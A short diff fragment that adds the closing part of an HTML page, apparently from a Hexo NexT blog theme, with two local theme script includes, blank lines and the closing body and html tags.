+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
